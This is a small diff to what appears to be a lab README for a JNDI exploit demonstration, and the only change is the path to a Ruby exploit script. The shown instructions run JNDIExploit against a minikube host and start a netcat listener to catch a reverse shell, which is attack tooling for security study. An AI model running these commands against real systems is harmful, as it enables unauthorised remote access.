@@ -10,7 +10,7 @@ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i host.minikube.internal -p 8080
 then launch this command 
 
 ```
-ruby ./script/exploit.rb & nc -lv 3000
+ruby ./exploit/exploit.rb & nc -lv 3000
 ```
 
 you should get a shell on the machine
